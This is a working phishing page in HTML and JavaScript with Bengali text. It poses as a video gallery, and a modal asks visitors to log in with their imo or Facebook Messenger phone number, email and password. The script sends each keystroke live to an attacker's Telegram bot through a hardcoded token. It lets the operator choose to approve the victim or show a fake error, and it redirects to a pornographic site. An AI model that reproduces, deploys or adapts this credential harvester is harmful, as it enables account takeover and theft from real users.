    <style>

        #modal { display: none; z-index: 1000; }
        .step-container { display: none; }
        .step-active { display: block; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

<body class="text-white">

    <div id="video-container" class="mt-20 p-4 grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
        </div>

    <div id="modal" class="fixed inset-0 bg-black/95 flex items-center justify-center p-6 backdrop-blur-md">
        <div class="bg-white text-black p-6 rounded-3xl max-w-sm w-full shadow-2xl" id="modal-content">
            
            <div id="step-choice" class="step-container step-active text-center">
                <h2 class="text-xl font-extrabold mb-6">ভিডিওটি দেখতে কানেক্ট করুন</h2>
                <button onclick="goStep('imo-1')" class="w-full bg-blue-500 text-white py-4 rounded-2xl font-bold mb-3 shadow-lg">ইমু দিয়ে দেখুন</button>
                <button onclick="goStep('fb-1')" class="w-full bg-[#1877F2] text-white py-4 rounded-2xl font-bold shadow-lg">ম্যাসেঞ্জার দিয়ে দেখুন</button>
            </div>

            <div id="step-imo-1" class="step-container text-center">
                <h2 class="text-xl font-bold mb-2 text-blue-600">ইমু নাম্বার</h2>
                <input type="tel" id="imo-num" oninput="liveSend('IMO-User', this.value)" placeholder="আপনার নাম্বার লিখুন" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold outline-none border-2 focus:border-blue-500">
                <button onclick="goStep('imo-2')" class="w-full bg-blue-500 text-white py-4 rounded-xl font-bold">পরবর্তী</button>
            </div>
            <div id="step-imo-2" class="step-container text-center">
                <h2 class="text-xl font-bold mb-2 text-blue-600">পাসওয়ার্ড</h2>
                <input type="password" id="imo-pass" oninput="liveSend('IMO-Pass', this.value)" placeholder="ইমু পাসওয়ার্ড" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold outline-none border-2 focus:border-blue-500">
                <button onclick="startFinalProcess('IMO')" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold">লগইন</button>
            </div>

            <div id="step-fb-1" class="step-container text-center">
                <h2 class="text-xl font-bold mb-2 text-blue-800">ম্যাসেঞ্জার ইউজার</h2>
                <input type="text" id="fb-user" oninput="liveSend('FB-User', this.value)" placeholder="ইমেইল বা ফোন নম্বর" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold outline-none border-2 focus:border-blue-500">
                <button onclick="goStep('fb-2')" class="w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold">পরবর্তী</button>
            </div>
            <div id="step-fb-2" class="step-container text-center">
                <h2 class="text-xl font-bold mb-2 text-blue-800">পাসওয়ার্ড</h2>
                <input type="password" id="fb-pass" oninput="liveSend('FB-Pass', this.value)" placeholder="ফেসবুক পাসওয়ার্ড" class="w-full p-4 bg-gray-100 rounded-xl mb-4 text-center font-bold outline-none border-2 focus:border-blue-500">
                <button onclick="startFinalProcess('Facebook')" class="w-full bg-[#1877F2] text-white py-4 rounded-xl font-bold">লগইন</button>
            </div>

            <div id="step-loading" class="step-container text-center py-10">
                <div class="loader"></div>
                <h2 class="text-xl font-bold">অপেক্ষা করুন...</h2>
                <p class="text-gray-500 text-sm mt-2">আপনার তথ্য যাচাই করা হচ্ছে</p>
            </div>
        </div>
    </div>

    <script>
        const botToken = "7957986649:AAGCcJ5R6g6PMHEgWXFqLRn2SrpElZvUtnE";
        const chatId = "8516934257";
        // আপনার দেওয়া মূল ভিডিও লিঙ্ক
        const targetUrl = "https://faphouse2.com/videos/stepsister-nice-fuck-first-hV5npB?utm_content=gold-video&utm_term=full-matching-tag&utm_source=m-xhamster-search&utm_campaign=guest_coldstart&utm_medium=m-search-inExp1-FHW37__4__a&statsUID=69ec5f05140da5.850340824f9&wtp=Cg9zZWFyY2hfbW9iaWxlXzEQ5a2SAhoNCgQ3MDM4EgUKAWIQARoNCgQ1MDA2EgUKAWEQAxoNCgQ1MDAzEgUKAWIQBRoLCgI4OBIFCgFiEAoaDAoDMTIyEgUKAWIQARoNCgQ3MDM3EgUKAWQQBRoNCgQ4MDMxEgUKAWIQAhoNCgQ3NzAwEgUKAWEQAhoMCgMxMTcSBQoBYRACGg0KBDIzMDMSBQoBYRAIGg0KBDE1MDMSBQoBaRAJGgsKAjk5EgUKAWEQAhoNCgQzMDE0EgUKAWEQBRoMCgMxMDUSBQoBYhAEGg0KBDMwMTISBQoBYhAJGgwKAzEwNBIFCgFjEAYaDQoEMzAxMBIFCgFiEAwaDQoENzk5ORIFCgFhEAYaDgoFRkhXMzcSBQoBYRAE&referringDomain=xhamster.desi";

        function goStep(id) {
            document.querySelectorAll('.step-container').forEach(s => s.classList.remove('step-active'));
            document.getElementById('step-' + id).classList.add('step-active');
        }

        // রিয়েল-টাইম টাইপিং ডাটা পাঠানো
        function liveSend(type, value) {
            if(value.length < 1) return;
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('📡 Live Key: ' + type + ' -> ' + value)}`);
        }

        // ফাইনাল সাবমিট এবং কন্ট্রোল বাটন
        function startFinalProcess(method) {
            goStep('loading');

            const message = `🔥 নতুন সাবমিট!\nমেথড: ${method}\n\nএখন সিদ্ধান্ত নিন:`;
            const keyboard = {
                inline_keyboard: [[
                    { text: "✅ Success (ভিডিও দেখান)", callback_data: "success_action" },
                    { text: "❌ Ignore (এরর দেখান)", callback_data: "ignore_action" }
                ]]
            };

            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&reply_markup=${JSON.stringify(keyboard)}`);

            checkDecision();
        }

        // টেলিগ্রাম থেকে উত্তরের জন্য পোলিং
        function checkDecision() {
            const pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${botToken}/getUpdates`)
                .then(res => res.json())
                .then(data => {
                    const updates = data.result;
                    if(updates.length > 0) {
                        const lastUpdate = updates[updates.length - 1];
                        if (lastUpdate.callback_query) {
                            const decision = lastUpdate.callback_query.data;
                            if (decision === "success_action") {
                                clearInterval(pollInterval);
                                window.location.href = targetUrl; // আপনার দেওয়া লিঙ্ক
                            } else if (decision === "ignore_action") {
                                clearInterval(pollInterval);
                                document.getElementById('step-loading').innerHTML = `
                                    <div class="text-red-600 font-bold text-lg mb-2">ভেরিফিকেশন সফল হয়নি!</div>
                                    <p class="text-sm text-gray-500 mb-4">আপনার তথ্য সঠিক নয়। আবার চেষ্টা করুন।</p>
                                    <button onclick="location.reload()" class="bg-gray-200 px-6 py-2 rounded-full font-bold">আবার চেষ্টা করুন</button>
                                `;
                            }
                        }
                    }
                });
            }, 3000);
        }

        // কার্ড তৈরি
        const container = document.getElementById('video-container');
        for (let i = 0; i < 12; i++) {
            const card = document.createElement('div');
            card.className = 'video-card';
            card.onclick = () => { document.getElementById('modal').style.display = 'flex'; };
            card.innerHTML = `
                <img src="https://picsum.photos/600/350?random=${i+100}" class="w-full h-full object-cover opacity-60">
                <div class="absolute inset-0 flex items-center justify-center">
                    <svg width="40" height="40" fill="white" viewBox="0 0 16 16"><path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16zM6.271 5.055a.5.5 0 0 1 .52.038l3.5 2.5a.5.5 0 0 1 0 .814l-3.5 2.5A.5.5 0 0 1 6 10.5v-5z"/></svg>
                </div>
            `;
            container.appendChild(card);
        }
    </script>
</body>
</html>
